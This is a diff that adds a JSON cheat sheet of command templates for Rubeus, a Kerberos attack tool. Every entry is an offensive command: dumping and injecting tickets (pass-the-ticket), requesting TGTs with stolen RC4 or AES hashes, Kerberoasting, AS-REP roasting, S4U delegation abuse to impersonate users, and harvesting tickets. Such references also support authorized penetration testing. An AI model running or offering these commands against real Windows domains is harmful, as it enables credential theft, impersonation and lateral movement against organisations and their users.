@@ -1,0 +1,31 @@
+{
+  "Rubeus": {
+    "Dump All Tickets": ".\\Rubeus.exe dump",
+    "Dump Tickets (Base64)": ".\\Rubeus.exe dump /nowrap",
+    "Dump Tickets (Filter by LUID)": ".\\Rubeus.exe dump /luid:<hex_luid> /nowrap",
+    "List Tickets (Triage)": ".\\Rubeus.exe triage",
+    "List Tickets (Detailed)": ".\\Rubeus.exe klist",
+    "Describe Ticket": ".\\Rubeus.exe describe /ticket:<file_or_b64>",
+    "Inject Ticket (PTT)": ".\\Rubeus.exe ptt /ticket:<file_or_b64>",
+    "Inject Ticket to LUID": ".\\Rubeus.exe ptt /luid:<hex_luid> /ticket:<file_or_b64>",
+    "Purge Tickets": ".\\Rubeus.exe purge",
+    "Request TGT (Password)": ".\\Rubeus.exe asktgt /user:<user> /password:<pass> [/domain:<domain>] [/dc:<dc>] [/ptt] [/nowrap]",
+    "Request TGT (RC4/NTLM)": ".\\Rubeus.exe asktgt /user:<user> /rc4:<rc4_hash> [/domain:<domain>] [/dc:<dc>] [/ptt] [/nowrap]",
+    "Request TGT (AES256)": ".\\Rubeus.exe asktgt /user:<user> /aes256:<aes256_hash> [/domain:<domain>] [/dc:<dc>] [/ptt] [/nowrap]",
+    "Request TGT (Certificate/PKINIT)": ".\\Rubeus.exe asktgt /user:<user> /certificate:<pfx_or_thumbprint> [/password:<pfx_pwd>] [/ptt] [/nowrap]",
+    "Request TGT (CreateNetOnly)": ".\\Rubeus.exe asktgt /user:<user> </password:<pass>|/rc4:<rc4_hash>|/aes256:<aes256_hash>> /createnetonly:C:\\Windows\\System32\\cmd.exe [/show] [/nowrap]",
+    "Renew TGT": ".\\Rubeus.exe renew /ticket:<file_or_b64> [/ptt] [/nowrap]",
+    "Request TGS (from Ticket)": ".\\Rubeus.exe asktgs /ticket:<file_or_b64> /service:<spn[,spn2,...]> [/ptt] [/nowrap]",
+    "TGT Delegation (tgtdeleg)": ".\\Rubeus.exe tgtdeleg [/target:<spn>]",
+    "Monitor New Tickets": ".\\Rubeus.exe monitor [/interval:<sec>] [/targetuser:<user>] [/nowrap]",
+    "Harvest Tickets": ".\\Rubeus.exe harvest [/monitorinterval:<sec>] [/displayinterval:<sec>] [/targetuser:<user>] [/nowrap]",
+    "Kerberoast (All)": ".\\Rubeus.exe kerberoast [/user:<user>] [/domain:<domain>] [/dc:<dc>] [/nowrap]",
+    "Kerberoast (SPN List File)": ".\\Rubeus.exe kerberoast /spns:<spn_list.txt> [/outfile:<hashes.txt>] [/nowrap]",
+    "Kerberoast (OPSEC Console Format)": ".\\Rubeus.exe kerberoast /rc4opsec /nowrap",
+    "ASREP-Roast (User)": ".\\Rubeus.exe asreproast /user:<user> [/domain:<domain>] [/dc:<dc>] [/outfile:<hashes.txt>]",
+    "S4U (Constrained Delegation)": ".\\Rubeus.exe s4u </ticket:<file_or_b64>|/user:<delegating_account> </rc4:<rc4_hash>|/aes256:<aes256_hash>>> /impersonateuser:<user> /msdsspn:<service/server> [/ptt] [/nowrap]",
+    "S4U (Alt Service)": ".\\Rubeus.exe s4u /user:<acct> /aes256:<hash> /impersonateuser:<user> /msdsspn:<service/server> /altservice:<svc> [/ptt] [/nowrap]",
+    "Create NetOnly Logon": ".\\Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:<domain> /username:<user> /password:<pass>",
+    "Create NetOnly + Inject Ticket": ".\\Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:<domain> /username:<user> /password:<pass> /ticket:<file_or_b64>"
+  }
+}
